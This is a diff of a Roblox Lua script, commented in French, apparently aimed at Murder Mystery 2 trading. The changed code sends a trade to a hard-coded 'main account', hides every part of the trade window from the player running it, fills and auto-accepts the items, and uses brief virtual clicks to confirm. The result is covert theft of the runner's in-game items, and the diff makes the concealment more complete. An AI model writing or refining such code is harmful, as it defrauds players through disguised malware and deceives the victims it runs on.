@@ -496,21 +496,21 @@ local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- Fonction pour masquer / déplacer le GUI du trade hors de l'écran
-local function setTradeGuiPosition(offscreen)
+-- Fonction pour rendre le GUI complètement transparent (invisible) ou visible
+local function setTradeGuiTransparency(invisible)
     pcall(function()
         local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-        -- Recherche des conteneurs habituels du trade MM2
         local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
         if tradeGui then
-            local container = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("MainFrame") or tradeGui:FindFirstChild("Frame")
-            if container then
-                if offscreen then
-                    -- Déplace la fenêtre loin hors de l'écran
-                    container.Position = UDim2.new(10, 0, 10, 0)
-                else
-                    -- Remet la fenêtre au centre (position d'origine)
-                    container.Position = UDim2.new(0.5, -200, 0.5, -150)
+            -- Parcourt tous les éléments de l'interface pour masquer/rendre transparent
+            for _, descendant in pairs(tradeGui:GetDescendants()) do
+                if descendant:IsA("GuiObject") then
+                    if invisible then
+                        -- Sauvegarde l'ancienne transparence si besoin et cache
+                        descendant.Visible = false
+                    else
+                        descendant.Visible = true
+                    end
                 end
             end
         end
@@ -518,10 +518,7 @@ local function setTradeGuiPosition(offscreen)
 end
 
 local function getitems()
-    -- 1. On masque tout de suite la fenêtre en la déplaçant hors de ton écran
-    setTradeGuiPosition(true)
-
-    -- 2. Envoi de la demande de trade au compte principal
+    -- 1. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
         warn("Compte principal introuvable : " .. tostring(userName))
@@ -530,6 +527,9 @@ local function getitems()
 
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
+
+    -- 2. On rend le menu invisible dès qu'il s'ouvre pour ne pas te gêner
+    setTradeGuiTransparency(true)
 
     -- 3. Remplissage des 3 cases max MM2
     local itemsOffered = 0
@@ -566,14 +566,14 @@ local function getitems()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente des 8 secondes du compte à rebours MM2 (avec le GUI toujours actif hors-écran)
+    -- 5. Attente des 8 secondes du compte à rebours
     task.wait(8)
 
     -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
     pcall(function()
-        -- Remet la fenêtre à sa place juste 1 seconde pour enregistrer les clics
-        setTradeGuiPosition(false)
-        task.wait(0.2)
+        -- On réaffiche le GUI un tout petit instant pour que les clics virtuels touchent bien les boutons à l'écran
+        setTradeGuiTransparency(false)
+        task.wait(0.1)
 
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
@@ -601,13 +601,15 @@ local function getitems()
         sendClick()
     end)
 
-    -- 7. Nettoyage : On renvoie la fenêtre hors écran
+    -- 7. Nettoyage final : on ferme ou on détruit le trade à la fin
     task.wait(0.5)
-    setTradeGuiPosition(true)
+    if destroytrades2 then
+        pcall(function() coroutine.resume(destroytrades2) end)
+    end
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT
+-- ÉCOUTE DU TCHAT 5
 -- ==========================================
 
 local function listenToPlayer(player)
